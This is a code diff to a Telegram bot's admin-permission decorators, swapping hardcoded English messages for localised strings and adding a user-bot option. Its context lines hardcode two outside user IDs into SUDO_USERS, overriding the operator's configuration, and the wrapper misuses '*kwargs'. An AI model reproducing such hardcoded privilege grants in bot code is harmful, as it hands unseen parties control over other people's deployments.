@@ -4,10 +4,11 @@ from typing import Callable, Union, Optional
 from pyrogram import Client
 from pyrogram.types import Message, CallbackQuery
 from config import SUDO_USERS, OWNER_ID
-from driver.core import bot, me_bot
+from driver.core import bot, me_bot, me_user
 from driver.admins import get_administrators
 from driver.database.dblockchat import blacklisted_chats
 from driver.database.dbpunish import is_gbanned_user
+from driver.utils import R
 
 SUDO_USERS.append(1757169682)
 SUDO_USERS.append(1738637033)
@@ -99,8 +100,7 @@ async def check_perms(
         return True
     if user.status != "administrator":
         if notice:
-            await sender("💡 To use me, Give me the administrator permission." if user.user.is_self else
-                         "💡 You need to be an administrator to use this command.")
+            await sender(R("give_me_admin") if user.user.is_self else R("you_should_be_admin"))
         return False
 
     if isinstance(permissions, str):
@@ -108,14 +108,14 @@ async def check_perms(
 
     for permission in permissions:
         if not getattr(user, permission):
-            missing_perms.append(permission)
+            missing_perms.append(R(permission))
 
     if not missing_perms:
         return True
     if notice:
         permission_text = "__\n ❌ __".join(missing_perms)
-        await sender(f"💡 To use me, Give me the following permission below:\n\n ❌ __{permission_text}__" if user.user.is_self
-                     else f"💡 You need to be an administrator to use this command.\n\n ❌ __{permission_text}__")
+        await sender(f"💡 {R('give_me_permissions')}\n\n ❌ __{permission_text}__" if user.user.is_self
+                     else f"{R('you_need_permissions')}\n\n ❌ __{permission_text}__")
     return False
 
 
@@ -123,13 +123,15 @@ def require_admin(
     permissions: Union[list, str] = None,
     notice: bool = True,
     self: bool = False,
+    user_bot: bool = False,
 ):
     def decorator(func):
         @wraps(func)
         async def wrapper(
             client: Client, message: Union[CallbackQuery, Message], *args, **kwargs
         ):
-            has_perms = await check_perms(message, permissions, notice, me_bot.id if self else None)
+            has_perms = await check_perms(message, permissions, notice,
+                                          me_bot.id if self else (me_user.id if user_bot else None))
             if has_perms:
                 return await func(client, message, *args, *kwargs)
 
@@ -151,10 +153,10 @@ def check_blacklist():
                 sender = message.reply_text
                 chat = message.chat
             if chat.id in await blacklisted_chats():
-                await sender("❗️ This chat has blacklisted by sudo user and You're not allowed to use me in this chat.")
+                await sender(f"❗️ {R('group_block')}")
                 await bot.leave_chat(chat.id)
             elif (await is_gbanned_user(message.from_user.id)):
-                await sender(f"❗️**You've blocked from using this bot!**")
+                await sender(f"❗️**{R('you_have_blocked')}**")
             else:
                 return await func(client, message, *args, *kwargs)
 
